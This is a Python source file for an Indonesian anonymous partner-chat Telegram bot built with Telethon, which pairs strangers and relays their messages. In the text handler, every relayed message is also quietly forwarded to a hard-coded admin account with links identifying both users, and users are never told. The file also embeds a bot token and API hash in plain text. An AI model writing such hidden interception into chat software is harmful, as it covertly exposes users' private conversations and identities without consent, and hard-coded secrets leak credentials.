from telethon import TelegramClient, events
from telethon.errors import *
import json

bot_token = "1008264405:AAE_6ziGzgLCcKoIQvcYr9An9CttmrIaFHE"
api_id = 1141161
api_hash = 'cea6e327693f3d9a366822f3b2b13bf2'
client = TelegramClient("session/bot", api_hash=api_hash, api_id=api_id).start(bot_token=bot_token)

async def check(id: int):
    with open("pasangan.json", "r") as f:
        data = json.loads(f.read())
        for a in data:
            if str(id) in a:
                return True
    return False

async def getPartner(id: int):
    with open("pasangan.json", "r") as f:
        data = json.loads(f.read())
        for a in data:
            if str(id) in a:
                if a[0] != str(id):
                    return a[0]
                else: return a[1]

async def addPartner(id: int, uid: int):
    with open("pasangan.json", "r") as f:
        data = json.loads(f.read())
        data.append([str(id), str(uid)])
    with open("pasangan.json", "w") as f:
        f.write(json.dumps(data, indent=4))

async def deletePartner(id: int):
    newData = []
    with open("pasangan.json", "r") as f:
        data = json.loads(f.read())
        for a in data:
            if not str(id) in a:
                newData.append(a)
    with open("pasangan.json", "w") as f:
        f.write(json.dumps(newData, indent=4))

async def checkAntrian():
    with open("antrian.json", "r") as f:
        data = json.loads(f.read())
        if len(data) == 0:
            return False, 0
        else: return True, int(data[0])

async def addAntrian(id: int):
    with open("antrian.json", "r") as f:
        data = json.loads(f.read())
        data.append(str(id))
    with open("antrian.json", "w") as f:
        f.write(json.dumps(data, indent=4))

async def deleteAntrian():
    with open("antrian.json", "w") as f:
        f.write(json.dumps([], indent=4))

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private, pattern="/search"))
async def search(message):
    message = message.message
    if message.message == "/search":
        uid = message.peer_id.user_id
        if await check(uid):
            await client.send_message(message.peer_id, "kamu sudah punya partner, gunakan /stop untuk menghentikan obrolan!")
            return
        if not (await checkAntrian())[0]:
            await client.send_message(message.peer_id, "searching for partner, please stand up!")
            await addAntrian(uid)
            return
        else:
            id = (await checkAntrian())[1]
            if uid == id:
                await client.send_message(message.peer_id, "searching for partner, please stand up!")
                return
            await deleteAntrian()
            await addPartner(id, uid)
            teks = "Partner Found !"
            await client.send_message(id, teks)
            await client.send_message(uid, teks)
    else: return

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private, pattern="/stop"))
async def stop(message):
    message = message.message
    if message.message == "/stop":
        uid = message.peer_id.user_id
        if not (await check(uid)):
            await client.send_message(message.peer_id, "kamu belum punya partner, gunakan /search untuk memulai obrolan!")
            return
        else:
            pid = int(await getPartner(uid))
            await deletePartner(uid)  
            teks = "Obrolan berakhir !"
            await client.send_message(pid, teks)
            await client.send_message(uid, teks)
    else: return

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def teks(message):
    message = message.message
    if message.message == "/search" or message.message == "/stop": return
    uid = message.peer_id.user_id
    if await check(uid):
        pid = int(await getPartner(uid))
        # Kirim ke partner
        await client.send_message(pid, message)
        # Kirim ke admin
        user = await client.get_entity(uid)
        partner = await client.get_entity(pid)
        await client.send_message(1338208948, f"<a href='tg://user?id={user.id}'>{user.first_name}</a> -> <a href='tg://user?id={pid}'>{partner.first_name}</a>", parse_mode="html")
        await client.send_message(1338208948, message)
    else:
        await client.send_message(message.peer_id, "gunakan /search untuk mencari partner!")
        return

async def main():
    await client.run_until_disconnected()
client.loop.run_until_complete(main())
